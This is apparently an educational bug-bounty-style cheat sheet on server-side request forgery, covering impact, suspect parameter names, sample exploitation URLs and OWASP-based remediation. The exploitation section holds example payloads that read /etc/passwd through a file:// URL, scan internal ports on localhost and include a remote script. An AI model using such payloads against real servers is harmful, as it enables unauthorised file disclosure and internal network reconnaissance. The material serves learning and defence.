# SSRF (Server Side Request Forgery)

SSRF refers to an attack where an attacker is able to send crafted request from vulnerable web application.

Attacker use parameters used in web application to control request from vulnerable server.
e.g:. `http://websitename.com/?parameter=http://anotherwebsite.com` So server is making request behalf of attacker.

## Impact 

- Bypass ip whitelisting
- Bypass host based authentication
- Scan the internal network
- Abuse of vulnerable website to blacklist 

## 🔎 How to Find

Find any parameter that may have some kind of external interaction or they can interact to external domain.

Example: `http://example.com/profile/php?uri=http://externalwebsite.com `

## Possible Related parameter for SSRF

```
| dest | redirect | uri | path | continue | url | window | next | data | reference | site | html | val | validate 
| domain | callback | return | page | view | dir | show | file | document | folder | root | path | pg | style 
| pdf | template | php_path | doc | feed | host | port | to | out | navigation open result
```

## Exploitation

1. Read file from the server: `http://example.com/profile?file=file:///../etc/passwd`  (here **../etc/passwd** is payload. replace with other payload)

2. Scan internal network open ports: `http://example.com/profile?file=http://localhost:21`  (here **21** is port. change one by one)

3. SSRF through RFI: `http://example.com/profile?file=https://yourwebsite.com/test.html`  (Create malicioud file **test.html** with contain this ` <script>alert(1)</script> ` script and host this file at server.

## Remediation
1. From Application layer:

 - Sanitize and validate all client-supplied input data
 - Enforce the URL schema, port, and destination with a positive allow list
 - Do not send raw responses to clients
 - Disable HTTP redirections
 - Be aware of the URL consistency to avoid attacks such as DNS rebinding and “time of check, time of use” (TOCTOU) race conditions

Do not mitigate SSRF via the use of a deny list or regular expression. Attackers have payload lists, tools, and skills to bypass deny lists.

2. From Network layer

 - Segment remote resource access functionality in separate networks to reduce the impact of SSRF.
 - Enforce “deny by default” firewall policies or network access control rules to block all but essential intranet traffic.
    Hints:
    ~ Establish an ownership and a lifecycle for firewall rules based on applications.
    ~ Log all accepted and blocked network flows on firewalls (see A09:2021-Security Logging and Monitoring Failures).

3. Additional Measures to consider:

 - Don't deploy other security relevant services on front systems (e.g. OpenID). Control local traffic on these systems (e.g. localhost)
 - For frontends with dedicated and manageable user groups use network encryption (e.g. VPNs) on independant systems to consider very high protection needs


## Refrence 

- https://portswigger.net/web-security/ssrf
- https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
